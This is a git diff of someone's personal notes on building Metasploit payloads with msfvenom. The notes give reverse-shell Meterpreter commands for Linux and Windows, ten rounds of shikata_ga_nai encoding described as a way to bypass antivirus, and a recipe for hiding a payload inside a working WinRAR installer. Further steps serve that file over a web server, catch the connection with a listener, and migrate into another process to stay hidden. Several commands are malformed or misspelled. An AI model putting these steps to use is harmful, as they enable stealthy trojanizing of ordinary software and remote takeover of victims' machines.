@@ -31,7 +31,7 @@ osx-app <- mac
 
 in linux no need to mention -a arcitecture 
 
-msfvenom -p /linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > /home/ryzen/payload32
+> msfvenom -p /linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > /home/ryzen/payload32
 
 no need to mention .elf
 
@@ -68,7 +68,7 @@ best <- x86/shikata_ga_nai  ploymorphic xor additive feedback encoder
   more interation of encode more chance of bypassing the AV
   
 
->msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT =<PORT> -i 10 -e x86/shikata_ga_nai -f exe > payload
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT =<PORT> -i 10 -e x86/shikata_ga_nai -f exe > payload
  
  	output:
 		Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
@@ -94,31 +94,38 @@ but it is much smaller than windows payloads
 
 #  Injecting Payloads Into Windows Portable Executables 
 
->msfvenom -x or --template for specify custom template also use -k or --keep to save behaviour and inject payload as a new thread
+msfvenom -x or --template for specify custom template also use -k or --keep to save behaviour and inject payload as a new thread
 
 BEST option winRAR executable
 
 generate 32 bin meterpreter payload then inject it in winrar setup file
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe > ~/Download/wrar32.exe > ~/payloads/winrar.exe
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe > ~/Download/wrar32.exe > ~/payloads/winrar.exe
 
 sudo python3 -m http.server 8080
 
 
-msfconsole 
-use mulit/handler
-set payload window/meterpreter/reverse_tcp
+>msfconsole 
+>use mulit/handler
+> set payload window/meterpreter/reverse_tcp
  
  > run post/windows/manage/migrate
  
  why? 
  ```bash
- ->a post-exploitation module known as "migrate," which is used in a Windows environment. Essentially, this tool helps move the process that a Metasploit payload is running on into another process. And the whole idea is to dodge any interferen from Windows that might shut down that original process. So if you run this migration command, it might, for instance, hop into something like a notepad.exe process and just carry on from there. It's like a little digital shapeshifter trick to keep things running smoothly. And from there, you don’t really have to sweat the details of those modules anymore. It's all part of the fun of post-exploitation magic.
+a post-exploitation module known as "migrate," which is used in a Windows environment.
+ Essentially, this tool helps move the process that a Metasploit payload is running on
+into another process. And the whole idea is to dodge any interferen from Windows that
+ might shut down that original process. So if you run this migration command, it might,
+for instance, hop into something like a notepad.exe process and just carry on from there.
+ It's like a little digital shapeshifter trick to keep things running smoothly. And from
+ there, you don’t really have to sweat the details of those modules anymore. It's all
+part of the fun of post-exploitation magic.
  ```
  k option 
  it mentain the original functianily of the portabel exectable and then it will execute the meterpreter payload lyeing inside the executable
  
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe *-k* > ~/Download/wrar32.exe > ~/payloads/winrarnew.exe 
+  > msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe *-k* > ~/Download/wrar32.exe > ~/payloads/winrarnew.exe 
   
   
   
